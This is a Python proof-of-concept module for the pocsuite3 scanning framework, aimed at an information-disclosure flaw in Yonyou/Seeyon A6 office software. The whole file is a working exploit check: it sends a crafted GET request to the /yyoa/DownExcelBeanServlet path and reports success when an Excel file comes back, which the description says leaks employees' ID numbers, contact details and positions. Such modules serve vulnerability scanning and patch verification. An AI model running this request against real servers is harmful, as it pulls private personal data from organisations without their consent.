#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''用友致远A6 DownExcelBeanServlet info_disclosure'''
    desc = '''泄漏员工的个人信息，包括身份证、联系方式、职位等敏感信息'''
    solution = ''''''
    severity = '''medium'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远'''
    appVersion = '''A6'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        result = {}
        self.url, ip, port = parse_ip_port(self.target, 80)
        vulurl = make_verify_url(self.url, '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0', mod=0)
        resp = requests.get(vulurl, timeout=15, allow_redirects=False, verify=False)
        if resp.status_code == 200 and resp.headers.get('content-disposition') and '.xls' in resp.headers.get('content-disposition'):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
